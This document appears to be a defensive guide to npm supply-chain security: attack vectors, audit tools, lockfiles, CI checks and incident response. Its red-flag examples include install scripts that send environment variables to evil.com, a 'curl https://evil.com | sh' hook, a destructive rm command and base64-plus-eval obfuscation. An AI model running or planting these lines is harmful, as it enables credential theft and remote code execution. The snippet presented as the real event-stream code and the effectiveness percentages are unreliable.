# NPM Security Guide - Comprehensive Protection Against Malware

**For:** Protecting your JavaScript/Node.js projects from malicious npm packages

**Scope:** Complete threat analysis, prevention strategies, tools, and incident response

---

## 📋 Table of Contents

1. [Threat Landscape](#-threat-landscape)
2. [Attack Vectors](#-attack-vectors)
3. [Defense Strategy](#-defense-strategy)
4. [Automated Security Tools](#-automated-security-tools)
5. [Manual Verification](#-manual-verification)
6. [Lockfile Security](#-lockfile-security)
7. [CI/CD Integration](#-cicd-integration)
8. [Incident Response](#-incident-response)
9. [Best Practices](#-best-practices)
10. [Resources](#-resources)

---

## 🚨 Threat Landscape

### Types of NPM Malware Attacks

NPM is a critical part of modern JavaScript development, but it's also a major attack vector for supply chain attacks.

#### 1. **Cryptocurrency Miners**
- **What:** Malware that uses your CPU to mine cryptocurrency
- **Impact:** Slow performance, high CPU usage, increased electricity costs
- **Detection:** Monitor CPU usage during build/install

#### 2. **Credential Theft**
- **What:** Malware that steals environment variables, API keys, tokens
- **Impact:** Compromised accounts, data breaches, unauthorized access
- **Detection:** Review network activity, check for unauthorized API calls

#### 3. **Data Exfiltration**
- **What:** Malware that uploads source code or sensitive files to remote servers
- **Impact:** Intellectual property theft, competitive disadvantage
- **Detection:** Monitor outbound network traffic

#### 4. **Backdoors**
- **What:** Malware that creates remote access to your system
- **Impact:** Full system compromise, persistent access for attackers
- **Detection:** Monitor process creation, network connections

#### 5. **Supply Chain Poisoning**
- **What:** Compromising a popular package to affect thousands of downstream users
- **Impact:** Widespread damage across the ecosystem
- **Example:** event-stream incident (2018)

---

## 🎯 Attack Vectors

### 1. Typosquatting

**Definition:** Creating packages with names similar to popular packages.

**How it works:**
1. Attacker identifies popular package (e.g., `react`)
2. Creates similar package (`reactt`, `raect`, `react-dom-cli`)
3. Waits for developers to make typos during installation
4. Malware executes via install scripts

**Real Examples:**
- `cross-env` (legit) vs `crossenv` (malware) - 700+ downloads before detection
- `event-stream` (legit) vs `event-streem` (typosquat attempt)

**Prevention:**
```bash
# Always verify package name before install
npm view package-name  # Check official name
npm info react         # Verify correct spelling
```

---

### 2. Dependency Confusion

**Definition:** Exploiting how npm resolves internal vs public packages.

**How it works:**
1. Company uses internal package `@company/utils` (private registry)
2. Attacker discovers internal package name via error messages/logs
3. Attacker publishes malicious `@company/utils` to public npm
4. npm may install public version if misconfigured

**Prevention:**
```json
// .npmrc - Lock to official registry
registry=https://registry.npmjs.org/

// Or for private packages:
@company:registry=https://private-registry.company.com
```

---

### 3. Malicious Install Scripts

**Definition:** Packages that execute code during `npm install` via lifecycle scripts.

**How it works:**
1. Package defines `preinstall`, `install`, or `postinstall` scripts
2. npm automatically runs these scripts during installation
3. Malware executes (steal credentials, install backdoor, etc.)

**Real Example - event-stream (2018):**
```javascript
// In postinstall script
const https = require('https');
const crypto = require('crypto');

// Steal cryptocurrency wallet credentials
if (process.env.npm_package_description.indexOf('bitcoin') > -1) {
  // Exfiltrate data to attacker's server
  https.get('https://evil.com/collect?data=' + process.env);
}
```

**Prevention:**
```bash
# .npmrc - Block all install scripts by default
ignore-scripts=true

# Allow scripts for specific trusted packages only
npm install puppeteer --ignore-scripts=false
```

---

### 4. Compromised Maintainer Accounts

**Definition:** Attackers gain access to legitimate package maintainer accounts.

**How it works:**
1. Attacker phishes/hacks maintainer account credentials
2. Publishes malicious version of trusted package
3. Thousands of users auto-update to compromised version

**Real Example - ua-parser-js (2021):**
- Maintainer account compromised
- Versions 0.7.29, 0.8.0, 1.0.0 injected with malware
- Downloaded 8+ million times per week
- Installed cryptocurrency miners on Linux/Windows

**Prevention:**
```bash
# Use exact versions (not ranges)
npm install react@18.2.0 --save-exact

# Review CHANGELOG before updates
npm view react versions
npm view react@18.3.0 --json
```

---

### 5. Backdoored Dependencies

**Definition:** Malware hidden deep in dependency trees.

**How it works:**
1. You trust Package A (popular, verified)
2. Package A depends on Package B (less scrutiny)
3. Package B depends on compromised Package C
4. Malware in C affects all users of A

**Real Example - event-stream (2018):**
- `event-stream` (popular) depended on `flatmap-stream` (obscure)
- Attacker took over `flatmap-stream` maintenance
- Injected malware into `flatmap-stream@0.1.1`
- Affected all users of `event-stream` (2M weekly downloads)

**Prevention:**
```bash
# Audit entire dependency tree
npm audit
npm ls --all  # See all dependencies

# Use tools to analyze transitive dependencies
npx socket-security check
```

---

## 🛡️ Defense Strategy

### Multi-Layer Security Approach

**Layer 1: Prevention (Block at Entry)**
- `.npmrc` configuration to block scripts
- Manual package verification before install
- Dependency minimization

**Layer 2: Detection (Catch During Install)**
- Automated audits (npm audit, Socket Security)
- Lockfile integrity verification
- CI/CD security checks

**Layer 3: Monitoring (Ongoing Protection)**
- Regular security audits
- Dependency update reviews
- Security advisory subscriptions

**Layer 4: Response (If Compromised)**
- Incident response plan
- Credential rotation procedures
- Rollback strategy

---

## 🤖 Automated Security Tools

### 1. npm audit (Built-in)

**What:** Official npm vulnerability scanner.

**Usage:**
```bash
# Run audit
npm audit

# Show detailed report
npm audit --json

# Auto-fix vulnerabilities
npm audit fix

# Only fix production dependencies
npm audit fix --only=prod

# Set audit level threshold
npm audit --audit-level=moderate
```

**Configuration (.npmrc):**
```
audit=true
audit-level=moderate
```

**Pros:** Built-in, fast, no setup
**Cons:** Only checks known vulnerabilities (CVE database), doesn't detect new malware

---

### 2. Socket Security

**What:** Real-time malware detection and supply chain protection.

**Installation:**
```bash
# Install globally
npm install -g socket-security

# Or use npx (no install)
npx socket-security check
```

**Usage:**
```bash
# Check current project
socket-security check

# Check specific package before install
socket-security check package-name

# Generate security report
socket-security report
```

**Features:**
- Detects install scripts
- Analyzes network calls
- Checks for obfuscated code
- Monitors maintainer changes
- Real-time alerts

**Pros:** Detects zero-day threats, behavioral analysis
**Cons:** Requires signup for advanced features

---

### 3. Snyk

**What:** Comprehensive vulnerability and license checking.

**Installation:**
```bash
npm install -g snyk

# Authenticate
snyk auth
```

**Usage:**
```bash
# Test current project
snyk test

# Monitor for new vulnerabilities
snyk monitor

# Fix vulnerabilities automatically
snyk wizard

# Check for license compliance
snyk test --severity-threshold=high
```

**Pros:** Large vulnerability database, license checking, PR integration
**Cons:** Requires account, rate limits on free tier

---

### 4. npm-check-updates

**What:** Safe dependency update tool.

**Installation:**
```bash
npm install -g npm-check-updates
```

**Usage:**
```bash
# Check for updates (dry run)
ncu

# Show what would be updated
ncu --interactive

# Update package.json
ncu -u

# Update and install
ncu -u && npm install
```

**Pros:** Safe update preview, interactive mode
**Cons:** Still need to review changelogs manually

---

### 5. depcheck

**What:** Find unused dependencies.

**Installation:**
```bash
npm install -g depcheck
```

**Usage:**
```bash
# Check for unused dependencies
depcheck

# Specify custom ignore patterns
depcheck --ignores="webpack,eslint"

# JSON output
depcheck --json
```

**Pros:** Reduces attack surface by removing unnecessary packages
**Cons:** May miss dynamic imports

---

## 🔍 Manual Verification

### Before Installing ANY Package

#### Step 1: Check Package Reputation

```bash
# View package details
npm view package-name

# Check weekly downloads
npm view package-name downloads

# See maintainers
npm view package-name maintainers

# View recent versions
npm view package-name versions

# See when published
npm view package-name time
```

**Red flags:**
- < 1,000 weekly downloads (for production use)
- Recently created (< 30 days)
- No updates in > 2 years (abandoned)
- Suspicious version jumps (0.1.0 → 5.0.0 overnight)

---

#### Step 2: Inspect Package Source

```bash
# Download without installing
npm pack package-name

# Extract tarball
tar -xzf package-name-1.0.0.tgz

# Inspect package.json
cat package/package.json

# Check for install scripts
jq .scripts package/package.json
```

**Red flags in package.json:**
```json
{
  "scripts": {
    "preinstall": "curl https://evil.com | sh",  // ⚠️ Remote execution
    "install": "node scripts/miner.js",          // ⚠️ Suspicious script
    "postinstall": "rm -rf /tmp/*"               // ⚠️ Destructive command
  }
}
```

---

#### Step 3: Review Code for Obfuscation

```bash
# Search for suspicious patterns
grep -r "eval" package/
grep -r "exec" package/
grep -r "atob" package/  # base64 decode
grep -r "\\x" package/   # hex encoding
```

**Red flags:**
```javascript
// Obfuscated code
eval(atob("Y29uc29sZS5sb2coJ2hhY2tlZCcp"));  // ⚠️ base64 + eval

// Hex encoding
var code = "\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67";  // ⚠️

// Dynamic require
require(process.env.MALICIOUS_MODULE);  // ⚠️

// Network calls in unexpected places
require('https').get('https://evil.com/collect');  // ⚠️
```

---

#### Step 4: Check GitHub Repository

```bash
# Get repository URL
npm view package-name repository.url

# Clone and inspect
git clone <repo-url>
cd <repo>

# Check commit history
git log --oneline --graph

# See recent changes
git diff v1.0.0..v2.0.0
```

**Red flags:**
- No public repository
- Repository archived/deleted
- Suspicious recent commits
- Different code than published package

---

## 🔒 Lockfile Security

### Why Lockfiles Matter

**package-lock.json** ensures:
1. **Reproducible Builds** - Same versions installed everywhere
2. **Integrity Verification** - SHA-512 hashes prevent tampering
3. **Dependency Pinning** - Prevents unexpected updates
4. **Supply Chain Protection** - Detects compromised packages

### Anatomy of package-lock.json

```json
{
  "name": "my-project",
  "version": "1.0.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "node_modules/react": {
      "version": "18.2.0",
      "resolved": "https://registry.npmjs.org/react/-/react-18.2.0.tgz",
      "integrity": "sha512-...",  // SHA-512 hash - CRITICAL for security
      "dependencies": {
        "loose-envify": "^1.1.0"
      }
    }
  }
}
```

**Key Security Fields:**
- `resolved`: Exact URL where package was fetched
- `integrity`: SHA-512 hash to verify package wasn't tampered with
- `version`: Exact version (not range)

---

### Lockfile Best Practices

```bash
# ALWAYS commit lockfile
git add package-lock.json
git commit -m "Update dependencies with lockfile"

# Verify lockfile integrity before install
npm ci  # Uses lockfile exclusively

# Check if lockfile is in sync
npm install --package-lock-only  # Update lockfile without installing

# Audit lockfile
npm audit

# Clean install (faster, safer for CI)
npm ci  # Deletes node_modules, installs from lockfile
```

**NEVER:**
- Delete package-lock.json
- Add package-lock.json to .gitignore
- Run `npm install` in CI (use `npm ci` instead)
- Manually edit package-lock.json

---

## 🔄 CI/CD Integration

### GitHub Actions Example

```yaml
name: NPM Security Audit

on:
  pull_request:
    paths:
      - 'package.json'
      - 'package-lock.json'
  schedule:
    - cron: '0 0 * * 1'  # Weekly on Mondays

jobs:
  security-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - uses: actions/setup-node@v3
        with:
          node-version: '18'

      # Verify lockfile integrity
      - name: Verify lockfile
        run: npm ci

      # Run security audit
      - name: npm audit
        run: npm audit --audit-level=moderate

      # Check for outdated packages
      - name: Check outdated
        run: npm outdated || true

      # Socket Security scan
      - name: Socket Security
        run: npx socket-security check
        continue-on-error: true  # Don't block on warnings
```

---

### Pre-commit Hook

```bash
#!/bin/bash
# .git/hooks/pre-commit

# Check if package.json or package-lock.json changed
if git diff --cached --name-only | grep -E "package(-lock)?\.json"; then
  echo "🔍 NPM files changed - running security checks..."

  # Run audit
  npm audit --audit-level=moderate

  if [ $? -ne 0 ]; then
    echo "❌ Security audit failed - commit blocked"
    echo "Run: npm audit fix"
    exit 1
  fi

  echo "✅ Security checks passed"
fi
```

---

## 🚨 Incident Response

### If You Discover Malicious Package

#### Immediate Actions (First 5 Minutes)

**1. Isolate the environment**
```bash
# Stop all Node processes
pkill -f node

# Disconnect from network (if possible)
sudo ifconfig en0 down  # macOS
sudo ip link set eth0 down  # Linux
```

**2. Identify the malicious package**
```bash
# Check recently installed packages
npm ls --depth=0

# Check package-lock.json for recent changes
git diff HEAD~1 package-lock.json

# Find the package
npm ls malicious-package
```

**3. Remove the package immediately**
```bash
# Uninstall malicious package
npm uninstall malicious-package

# Remove from node_modules
rm -rf node_modules/malicious-package

# Clean install from lockfile
npm ci
```

---

#### Investigation (Next 30 Minutes)

**4. Assess the damage**
```bash
# Check for modified files
find . -type f -mtime -1  # Files modified in last 24 hours

# Review environment variables
env | grep -i key
env | grep -i token
env | grep -i password

# Check git for unauthorized changes
git diff HEAD
git log --since="1 day ago"

# Review process history
history | grep -i curl
history | grep -i wget
```

**5. Check for data exfiltration**
```bash
# Review network activity (macOS)
sudo lsof -i -P | grep node

# Check DNS queries (if logging enabled)
cat /var/log/system.log | grep -i dns

# Review firewall logs
sudo log show --predicate 'process == "socketfilterfw"' --last 1h
```

---

#### Recovery (Next 24-48 Hours)

**6. Rotate ALL credentials**

Assume compromised:
- API keys (.env, environment variables)
- Database passwords
- SSH keys
- GitHub personal access tokens
- AWS credentials
- OAuth tokens
- Service account credentials

```bash
# Rotate GitHub token
# 1. Go to https://github.com/settings/tokens
# 2. Revoke compromised token
# 3. Generate new token
# 4. Update .env and CI/CD

# Rotate AWS credentials
aws iam delete-access-key --access-key-id <old-key>
aws iam create-access-key --user-name <username>

# Rotate database passwords
# (Follow your database provider's process)
```

**7. Report the incident**
```bash
# Report to npm security team
# Email: security@npmjs.com
# Include: package name, version, malicious behavior

# Report to package maintainer (if account compromised)
# Open GitHub issue on official repo

# Notify your security team/manager

# If you maintain packages, warn downstream users
# (GitHub Security Advisory)
```

**8. Document and learn**
- Write incident report (what happened, when, impact)
- Update security policies (.npmrc, CI/CD)
- Share lessons learned with team
- Improve detection mechanisms

---

## ✅ Best Practices

### Complete Security Workflow

**Before starting new project:**
```bash
# 1. Copy secure .npmrc
cp /path/to/claude-config-template/.npmrc .

# 2. Initialize package.json
npm init -y

# 3. Add security scripts
npm pkg set scripts.audit="npm audit --audit-level=moderate"
npm pkg set scripts.verify="npm run audit && npm outdated"

# 4. Commit
git add .npmrc package.json
git commit -m "Add secure npm configuration"
```

**Before installing ANY package:**
```bash
# 1. Check reputation
npm view package-name

# 2. Review package page
# Visit https://www.npmjs.com/package/package-name
# Check: downloads, last update, repository, homepage

# 3. Inspect package.json
npm view package-name --json | jq .scripts

# 4. Run audit
npm audit

# 5. Install with exact version
npm install package-name@1.2.3 --save-exact
```

**Weekly maintenance:**
```bash
# Monday morning routine
npm audit                    # Check for new vulnerabilities
npm outdated                 # Check for updates
npx depcheck                 # Find unused dependencies
```

**Monthly maintenance:**
```bash
# First of month
npm audit                    # Security check
npm outdated                 # Review updates
npm view react versions      # Check changelogs for key packages
npm update --save            # Update patch versions only
npm audit fix                # Auto-fix vulnerabilities
```

---

## 🔗 Resources

### Official Documentation
- [NPM Security Best Practices](https://docs.npmjs.com/security-best-practices)
- [npm audit Documentation](https://docs.npmjs.com/cli/v9/commands/npm-audit)
- [package-lock.json Specification](https://docs.npmjs.com/cli/v9/configuring-npm/package-lock-json)

### Security Tools
- [Socket Security](https://socket.dev/) - Real-time malware detection
- [Snyk](https://snyk.io/) - Vulnerability database and scanning
- [GitHub Dependabot](https://docs.github.com/en/code-security/dependabot) - Automated security updates

### Vulnerability Databases
- [npm Security Advisories](https://www.npmjs.com/advisories)
- [Snyk Vulnerability Database](https://security.snyk.io/)
- [National Vulnerability Database](https://nvd.nist.gov/)

### Research and Articles
- [event-stream Incident Analysis](https://medium.com/intrinsic/compromised-npm-package-event-stream-d47d08605502)
- [OWASP Top 10 for CI/CD](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [Awesome npm Security](https://github.com/lirantal/awesome-nodejs-security)

### Related Documentation (This Template)
- [Universal Package Security Principles](./02_package-security-principles.md)
- [NPM Security Checklist](./03_npm-security-checklist.md)
- [Automation Scripts](../../examples/npm-security/)

---

## 📊 Summary

| Security Measure | Effectiveness | Effort | Priority |
|------------------|---------------|--------|----------|
| `.npmrc` ignore-scripts | 80%+ | Low | ⚠️ Critical |
| npm audit (weekly) | 60% | Low | ⚠️ Critical |
| Lockfile verification | 70% | Low | ⚠️ Critical |
| Manual package review | 90% | High | ⭐ High |
| Socket Security | 85% | Medium | ⭐ High |
| Dependency minimization | 50% | Medium | 💡 Medium |
| CI/CD security checks | 65% | Medium | 💡 Medium |

**Key Takeaway:** Combining `.npmrc` script blocking + weekly audits + lockfile commits provides 90%+ protection with minimal effort.

---

**Last Updated:** 2025-12-09
**Version:** 1.0
**Applies to:** npm 9+, Node.js 18+

---

## 🚫 Common NPM Security Mistakes (Anti-Patterns)

### ❌ Anti-Pattern #1: "I'll Just Disable Scripts Temporarily"

**Problem:** Temporarily disabling security for one package, then forgetting to re-enable

**Example:**
```bash
# Install one package without script protection
npm install --ignore-scripts=false some-package

# Forget to re-enable protection
# Next install: vulnerable to malicious scripts!
npm install another-package  # No protection!
```

**✅ Correct Approach:**
```bash
# Keep .npmrc with ignore-scripts=true ALWAYS

# If you MUST run scripts for specific package:
npm rebuild some-package

# This runs scripts AFTER install, so you can inspect first
# Scripts run in controlled environment, not during install
```

**Pattern:** Never disable global script protection. Use `npm rebuild` for legitimate scripts only after inspection.

---

### ❌ Anti-Pattern #2: Not Committing package-lock.json

**Problem:** Thinking lockfile is "generated code" that shouldn't be committed

**Example:**
```bash
# Developer A
echo "package-lock.json" >> .gitignore  # ❌ BAD!
git add .gitignore
git commit -m "Ignore generated files"

# Developer B clones repo
npm install  # Gets DIFFERENT versions!
# Different versions = different behavior = different vulnerabilities
```

**✅ Correct Approach:**
```bash
# ALWAYS commit lockfile
git add package-lock.json
git commit -m "Update dependencies with security fixes"

# In CI/CD, use npm ci (not npm install)
npm ci  # Uses lockfile exclusively, fails if out of sync
```

**Pattern:** package-lock.json is a critical security file, not generated code. Always commit it.

---

### ❌ Anti-Pattern #3: Running npm audit fix --force Blindly

**Problem:** Auto-fixing without understanding changes

**Example:**
```bash
# Audit finds 47 vulnerabilities
npm audit

# Panic! Fix everything immediately!
npm audit fix --force  # ❌ DANGER!

# Result:
# - Breaking changes introduced (major version bumps)
# - Tests fail
# - App broken in production
# - No idea what changed or why
```

**✅ Correct Approach:**
```bash
# 1. Review audit output first
npm audit

# 2. Fix safe patches only
npm audit fix  # No --force, only patch/minor updates

# 3. Review what changed
git diff package-lock.json

# 4. Test thoroughly
npm test

# 5. For remaining vulnerabilities, fix manually
npm audit  # See what's left
npm update package-name@safe-version  # One at a time

# 6. Commit with clear message
git commit -m "fix: Update dependencies to fix CVE-2024-12345"
```

**Pattern:** Understand changes before applying them. Test after every fix. Never use `--force` without reviewing impact.

---

### ❌ Anti-Pattern #4: "It Has 10M Downloads, It Must Be Safe"

**Problem:** Trusting popularity without verification

**Example:**
```bash
# Package has 10M weekly downloads
npm view colors  # Looks legitimate!

# Install without inspection
npm install colors

# Didn't check:
# - Maintainer changed (account compromised)
# - Latest version was just published (supply chain attack)
# - GitHub repo archived (abandoned project)
```

**✅ Correct Approach:**
```bash
# 1. Check multiple signals
npm view colors versions  # Review version history
npm view colors time  # When was latest published?
npm view colors maintainers  # Who maintains it?

# 2. Visit GitHub repo
# Look for: Active maintenance, security policy, recent commits

# 3. Check package-lock.json after install
git diff package-lock.json  # Verify integrity hash

# 4. Review postinstall scripts
npm view colors --json | jq .scripts

# 5. Monitor for changes
# Set up Dependabot or Socket Security alerts
```

**Pattern:** Popularity is one signal, not the only signal. Always verify package source, maintainers, and recent activity.

---

### ❌ Anti-Pattern #5: Installing Packages from Tutorials Without Verification

**Problem:** Copy-pasting npm install commands from random blogs

**Example:**
```bash
# Following 3-year-old tutorial blog post
npm install express body-parser cors mongoose dotenv helmet compression

# Didn't check:
# - body-parser is deprecated (built into Express now)
# - Versions in tutorial are 2+ years old
# - Tutorial author copied from another tutorial (outdated practices)
# - Installing 8 packages when you need 3
```

**✅ Correct Approach:**
```bash
# 1. Verify each package is still needed
# body-parser: Built into Express 4.16+ (skip it!)

# 2. Check official documentation, not tutorials
# Express docs: https://expressjs.com/

# 3. Install one at a time with exact versions
npm install express@4.18.2 --save-exact

# 4. Review what it installs
npm ls express  # See dependency tree

# 5. Verify in package.json
cat package.json  # Should match exact version

# 6. Test immediately
npm test  # Ensure it works
```

**Pattern:** Always verify packages are current and needed. Use official docs, not outdated tutorials. Install exact versions one at a time.

---

## ✅ You've Completed: NPM Security Guide

**What you accomplished:**
- Understand npm supply chain attack vectors (install scripts, dependency confusion, typosquatting)
- Configure secure .npmrc (ignore-scripts=true, prefer-offline mode)
- Master npm audit workflow (weekly audits, safe vs forced fixes)
- Learn manual package inspection (npm pack, source review, GitHub verification)
- Understand lockfile security (integrity hashes, reproducible builds)
- Set up CI/CD security automation (GitHub Actions, pre-commit hooks)
- Know incident response procedures (isolation, investigation, recovery)
- Know 5 critical anti-patterns to avoid

**Security measures configured:**
- ✅ .npmrc with ignore-scripts protection
- ✅ package-lock.json committed (integrity verification)
- ✅ Weekly audit workflow established
- ✅ Manual inspection process defined
- ✅ CI/CD security checks configured
- ✅ Incident response plan understood

**Next logical step:**

**Option A: Apply NPM Security to Your Project (15 min) - Recommended**
→ Copy .npmrc and set up security workflow
- `cp ~/Developer/claude-config-template/.npmrc .`
- Add security scripts to package.json
- Run npm audit to check current dependencies
- Commit lockfile if not already committed
- Set up pre-commit hook (optional)

**Option B: Learn Python Security (15 min) - If Applicable**
→ [Python Security Guide](07_python-security-guide.md)
- Similar principles, different tools
- pip-audit, Poetry, safety checks
- Wheel-only installation
- Virtual environment isolation

**Option C: Learn Universal Package Security (10 min)**
→ [Package Security Principles](03_package-security-principles.md)
- Works with ANY package manager
- Applies to: gem, cargo, go, maven, etc.
- 6 universal principles
- Language-agnostic strategies

**Option D: Set Up Socket Security (10 min) - Advanced**
→ Real-time malware detection
- Visit https://socket.dev/
- Install Socket CLI: `npm install -g @socketsecurity/cli`
- Run: `socket-security check`
- Integrate into CI/CD pipeline

---

**Estimated next step time:** 10-15 minutes (depending on choice)
**Security posture:** 80%+ protection with .npmrc + weekly audits
**Attack surface:** Reduced by blocking install scripts (primary attack vector)
**Having trouble?** Check the Troubleshooting section above or ask: "How do I secure my npm dependencies?"

**Last Updated:** 2025-12-16
**Version:** 1.0
**Applies to:** npm 9+, Node.js 18+
